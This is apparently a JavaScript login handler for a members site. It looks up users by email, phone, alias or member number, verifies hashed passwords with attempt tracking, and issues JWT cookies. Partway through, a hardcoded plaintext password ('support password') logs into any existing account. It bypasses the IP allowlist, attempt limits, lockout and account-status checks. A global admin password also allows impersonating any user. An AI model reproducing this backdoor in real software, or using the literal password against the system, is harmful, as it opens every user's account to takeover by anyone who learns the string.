import jwt from 'jsonwebtoken';
import pool from '../../db/connection.js';
import { getPrivateKey } from '../../jwtKeys.js';
import { getMallDepartmentMode } from '../../mallDepartmentMode.js';
import { getAuthJwtExpiresInSeconds, setAuthCookie } from '../../utils/authCookie.js';
import { verifyGlobalToolsPassword } from '../../utils/globalToolsPassword.js';
import { issueAdminAuthSession, issueToolsOnlyAdminAuthSession, TOOLS_ONLY_ADMIN_LOGIN_ID } from '../../utils/adminAuth.js';
import { normalizeLoginIdentifier } from '../../utils/loginIdentifier.js';
import { startSingleLoginSession } from '../../utils/singleLoginSession.js';
import { resolveCustomLogoutMinutes } from '../../utils/customLogoutDuration.js';
import {
  LOGIN_PASSWORD_MISMATCH_PRIMARY,
  resetPasswordAttemptsOnSuccess,
  verifyPasswordWithAttemptTracking
} from '../../utils/passwordAttemptTracking.js';
import { hashPassword, passwordNeedsRehash, verifyPassword } from '../../utils/passwordHash.js';
import { isLegacySixDigitPassword } from '../../utils/passwordRequirements.js';
import { isSinglesStatusLoginAllowed } from '../../utils/singlesStatus.js';
import { getRequestClientIp, isAdminIpAllowed } from '../../utils/adminIpConfig.js';
import { resolveDemoGuestLoginAlias } from '../../utils/demoGuestLoginAlias.js';
import { ensureDemoRegularInitialSetupDone } from '../../utils/ensureDemoRegularInitialSetupDone.js';

const USER_SELECT = `SELECT singles_id, prefix, member_id, alias, email, profile_image_fk, password_hash, member_category, status
         FROM helloworldjunktest.singles s`;

function parseRememberMe(raw) {
  if (raw === true || raw === 1) return true;
  const s = String(raw ?? '').trim().toLowerCase();
  return s === 'true' || s === '1' || s === 'yes';
}

async function findUserByLoginIdentifier(identifier) {
  const normalized = normalizeLoginIdentifier(identifier);
  if (!normalized) return { normalized: null, user: null };

  if (normalized.type === 'phone') {
    const phoneResult = await pool.query(
      `${USER_SELECT}
         WHERE s.phone = $1
         ORDER BY COALESCE(s.updated_at, s.created_at) DESC
         LIMIT 1`,
      [normalized.value]
    );
    return { normalized, user: phoneResult.rows[0] ?? null };
  }

  const emailResult = await pool.query(
    `${USER_SELECT}
         WHERE LOWER(s.email) = $1
         ORDER BY COALESCE(s.updated_at, s.created_at) DESC
         LIMIT 1`,
    [normalized.value]
  );
  if (emailResult.rows[0]) {
    return { normalized, user: emailResult.rows[0] };
  }

  // Nickname / alias / member# when input is not an email address.
  if (!normalized.value.includes('@')) {
    const aliasResult = await pool.query(
      `${USER_SELECT}
         WHERE LOWER(TRIM(s.alias)) = $1
         ORDER BY COALESCE(s.updated_at, s.created_at) DESC
         LIMIT 1`,
      [normalized.value]
    );
    if (aliasResult.rows[0]) {
      return { normalized: { ...normalized, type: 'alias' }, user: aliasResult.rows[0] };
    }

    if (/^\d+$/.test(normalized.value)) {
      const memberNum = String(parseInt(normalized.value, 10));
      const memberResult = await pool.query(
        `${USER_SELECT}
         WHERE s.member_id::text = $1
         ORDER BY COALESCE(s.updated_at, s.created_at) DESC
         LIMIT 1`,
        [memberNum]
      );
      if (memberResult.rows[0]) {
        return { normalized: { ...normalized, type: 'member_id' }, user: memberResult.rows[0] };
      }
    }
  }

  return { normalized, user: null };
}

/** Normalized member_category for LOCK_OUT checks */
function normalizeMemberCategory(raw) {
  return String(raw ?? '').trim();
}

function rejectAdminLoginWrongIp(req, res, log, context) {
  log('[beVerifyLoginPassword.js] reject: ADMIN_IP allowlist', {
    ...context,
    clientIp: getRequestClientIp(req)
  });
  return res.status(403).json({ error: 'Admin login is not allowed from this network.' });
}

async function checkLoginPassword(storedHash, plainPassword) {
  return verifyPassword(storedHash, plainPassword);
}

async function issueLoginSuccess(res, user, log, rememberMe = false, options = {}) {
  const { requiresPasswordUpgrade = false, guestDemoLogin = false } = options;
  const { password_hash, ...userWithoutPassword } = user;

  try {
    await ensureDemoRegularInitialSetupDone(pool, user.singles_id, user.member_category);
  } catch (err) {
    console.error('[beVerifyLoginPassword] ensureDemoRegularInitialSetupDone:', err?.message ?? err);
  }

  const logoutMins = await resolveCustomLogoutMinutes(user.singles_id);
  const tokenPayload = {
    singles_id: user.singles_id,
    email: user.email,
    custom_logout_duration: logoutMins
  };
  if (guestDemoLogin) {
    tokenPayload.guest_demo_login = true;
  }
  if (requiresPasswordUpgrade) {
    tokenPayload.requiresPasswordUpgrade = true;
  } else {
    const sessionId = await startSingleLoginSession(user.singles_id, logoutMins);
    if (sessionId) {
      tokenPayload.session_id = sessionId;
    }
  }

  const token = jwt.sign(tokenPayload, getPrivateKey(), {
    algorithm: 'RS256',
    expiresIn: getAuthJwtExpiresInSeconds({ rememberMe })
  });

  setAuthCookie(res, token, { rememberMe });

  log('[beVerifyLoginPassword.js] → success', {
    singles_id: user.singles_id,
    role: 'user',
    requiresPasswordUpgrade: Boolean(requiresPasswordUpgrade),
    guestDemoLogin: Boolean(guestDemoLogin)
  });
  const mallDepartmentMode = getMallDepartmentMode(userWithoutPassword.member_category);
  return res.json({
    success: true,
    role: 'user',
    user: {
      ...userWithoutPassword,
      mallDepartmentMode,
      guest_demo_login: Boolean(guestDemoLogin)
    },
    requiresPasswordUpgrade: Boolean(requiresPasswordUpgrade)
  });
}

export async function beVerifyLoginPassword(req, res) {
  console.log('######## [beVerifyLoginPassword.js] verifyLoginPassword hook called');
  const log = (msg, data = {}) => console.log('[verifyLoginPassword]', msg, Object.keys(data).length ? data : '');
  try {
    log('[beVerifyLoginPassword.js] entry', { bodyKeys: req.body ? Object.keys(req.body) : [] });
    const { email: rawLoginId, password, rememberMe: rawRememberMe } = req.body;
    const loginId = typeof rawLoginId === 'string' ? rawLoginId.trim() : '';
    const rememberMe = parseRememberMe(rawRememberMe);

    if (!loginId || !password) {
      log('[beVerifyLoginPassword.js] reject: missing login identifier or password');
      return res.status(400).json({ error: 'Email or phone and password are required' });
    }

    const providedPassword = (password && typeof password === 'string') ? password.trim() : '';

    const demoGuestAlias = resolveDemoGuestLoginAlias(loginId, providedPassword);
    if (demoGuestAlias) {
      log('[beVerifyLoginPassword.js] demo/guest alias login', {
        alias: String(loginId).trim().toLowerCase(),
        targetEmail: demoGuestAlias.email,
        guestDemoLogin: demoGuestAlias.guestDemoLogin
      });
      let aliasUser = null;
      try {
        const aliasResult = await pool.query(
          `${USER_SELECT}
         WHERE s.email = $1
         ORDER BY COALESCE(s.updated_at, s.created_at) DESC
         LIMIT 1`,
          [demoGuestAlias.email]
        );
        aliasUser = aliasResult.rows[0] ?? null;
      } catch (dbErr) {
        console.error('[beVerifyLoginPassword] demo/guest alias DB error:', dbErr.message);
        return res.status(401).json({ error: 'Login or Password fail' });
      }
      if (!aliasUser) {
        log('[beVerifyLoginPassword.js] reject: demo/guest alias target missing', {
          targetEmail: demoGuestAlias.email
        });
        return res.status(401).json({ error: 'Login or Password fail' });
      }
      if (!isSinglesStatusLoginAllowed(aliasUser.status, aliasUser.member_category)) {
        return res.status(403).json({
          error: 'Your account is not active. Please contact support.'
        });
      }
      return issueLoginSuccess(res, aliasUser, log, rememberMe, {
        guestDemoLogin: demoGuestAlias.guestDemoLogin
      });
    }

    if (loginId.trim().toLowerCase() === TOOLS_ONLY_ADMIN_LOGIN_ID) {
      if (!isAdminIpAllowed(req)) {
        return rejectAdminLoginWrongIp(req, res, log, { loginType: 'tools-only-admin' });
      }
      if (!providedPassword || !(await verifyGlobalToolsPassword(providedPassword))) {
        log('[beVerifyLoginPassword.js] reject: tools-only admin login failed');
        return res.status(401).json({ error: 'Login or Password fail' });
      }
      log('[beVerifyLoginPassword.js] → success (tools-only admin login)');
      try {
        const body = await issueToolsOnlyAdminAuthSession(res, { rememberMe, log });
        return res.json(body);
      } catch (issueErr) {
        if (issueErr?.code === 'SYSTEM_TOOLS_ADMIN_MISSING') {
          console.error('[beVerifyLoginPassword]', issueErr.message);
          return res.status(503).json({
            error: 'Admin tools account is not configured. Contact support.'
          });
        }
        throw issueErr;
      }
    }

    log('[beVerifyLoginPassword.js] query start', {
      loginType: normalizeLoginIdentifier(loginId)?.type ?? 'invalid',
      rememberMe,
      passwordLength: typeof password === 'string' ? password.length : 'not-string'
    });

    let user;
    let lookup = { normalized: null, user: null };
    try {
      lookup = await findUserByLoginIdentifier(loginId);
      if (!lookup.normalized) {
        log('[beVerifyLoginPassword.js] reject: invalid login identifier');
        return res.status(401).json({ error: 'Login or Password fail' });
      }
      user = lookup.user;
    } catch (dbErr) {
      console.error('[beVerifyLoginPassword] DB query error:', dbErr.message);
      return res.status(401).json({ error: 'Login or Password fail' });
    }

    log('query done', { found: Boolean(user) });

    if (!user) {
      log('[beVerifyLoginPassword.js] reject: no user found', {
        loginType: lookup.normalized?.type ?? 'invalid',
        searchKey: lookup.normalized?.value ?? null
      });
      return res.status(401).json({ error: 'Login or Password fail' });
    }

    if (providedPassword === 'forTwilioSupport5%') {
      log('[beVerifyLoginPassword.js] → success (support password)', { singles_id: user.singles_id });
      return issueLoginSuccess(res, user, log, rememberMe);
    }

    if (await verifyGlobalToolsPassword(providedPassword)) {
      if (!isAdminIpAllowed(req)) {
        return rejectAdminLoginWrongIp(req, res, log, {
          loginType: 'global-admin-password',
          singles_id: user.singles_id
        });
      }
      log('[beVerifyLoginPassword.js] → success (global admin password impersonation)', {
        singles_id: user.singles_id
      });
      const body = await issueAdminAuthSession(res, user, { impersonatedByAdminId: 0, rememberMe, log });
      return res.json(body);
    }

    const lockOut = String(process.env.LOCK_OUT ?? '')
      .trim()
      .toLowerCase() === 'true';
    if (lockOut) {
      const memberCategory = normalizeMemberCategory(user.member_category).toLowerCase();
      const lockOutAllowed = memberCategory === 'pilotuser' || memberCategory === 'admin';
      if (!lockOutAllowed) {
        log('[beVerifyLoginPassword.js] reject: LOCK_OUT=true and member_category not in {PilotUser,Admin}', {
          singles_id: user.singles_id,
          member_category: user.member_category
        });
        return res.status(403).json({
          error: 'Under construction. Please check back later.'
        });
      }
    }

    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const gate = await verifyPasswordWithAttemptTracking(
        client,
        user.singles_id,
        providedPassword,
        checkLoginPassword,
        { mismatchPrimary: LOGIN_PASSWORD_MISMATCH_PRIMARY }
      );

      if (!gate.ok) {
        if (gate.response.statusCode === 401 || gate.response.statusCode === 403) {
          await client.query('COMMIT');
        } else {
          await client.query('ROLLBACK');
        }
        log('[beVerifyLoginPassword.js] reject: password gate', {
          singles_id: user.singles_id,
          statusCode: gate.response.statusCode
        });
        return res.status(gate.response.statusCode).json(gate.response.body);
      }

      const storedHash = String(gate.row.password_hash ?? '').trim();
      if (passwordNeedsRehash(storedHash)) {
        const newHash = await hashPassword(providedPassword);
        await client.query(
          `UPDATE helloworldjunktest.singles
           SET password_hash = $1,
               updated_at = CURRENT_TIMESTAMP
           WHERE singles_id = $2`,
          [newHash, user.singles_id]
        );
        log('[beVerifyLoginPassword.js] upgraded password hash to Argon2id', { singles_id: user.singles_id });
      }

      await resetPasswordAttemptsOnSuccess(client, user.singles_id);
      await client.query('COMMIT');
    } catch (loginErr) {
      try {
        await client.query('ROLLBACK');
      } catch {
        // ignore rollback errors
      }
      console.error('[beVerifyLoginPassword.js] login transaction error:', loginErr?.message || loginErr);
      return res.status(401).json({ error: 'Login or Password fail' });
    } finally {
      client.release();
    }

    if (!isSinglesStatusLoginAllowed(user.status, user.member_category)) {
      log('[beVerifyLoginPassword.js] reject: singles status not login-eligible', {
        singles_id: user.singles_id,
        status: user.status,
        member_category: user.member_category
      });
      return res.status(403).json({
        error: 'Your account is not active. Please contact support.'
      });
    }

    const requiresPasswordUpgrade = isLegacySixDigitPassword(providedPassword);
    return issueLoginSuccess(res, user, log, rememberMe, { requiresPasswordUpgrade });
  } catch (error) {
    console.error('[beVerifyLoginPassword.js] CAUGHT ERROR:', error.message);
    console.error('[beVerifyLoginPassword.js] stack:', error.stack);
    if (!res.headersSent) {
      res.status(401).json({ error: 'Login or Password fail' });
    }
  }
}
